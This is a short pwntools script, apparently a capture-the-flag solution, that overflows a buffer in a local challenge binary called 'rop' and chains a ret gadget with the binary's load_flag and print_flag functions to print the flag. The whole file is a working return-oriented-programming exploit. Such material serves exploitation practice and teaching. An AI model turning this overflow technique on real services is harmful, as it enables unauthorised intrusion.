from pwn import *

elf = context.binary = ELF('./rop')
context.log_level = "debug"
p = remote("localhost", "1338")
# p = process('./rop')
# p = gdb.debug('./rop')

# From ROPgadget:
# 0x0000000000401016 : ret

# rop = ROP(elf)
# ret = rop.find_gadget(['ret'])[0]
payload = b'A'*16 + p64(0x401016) + p64(elf.sym["load_flag"]) + p64(elf.sym["print_flag"])

p.sendline(payload)

p.interactive()

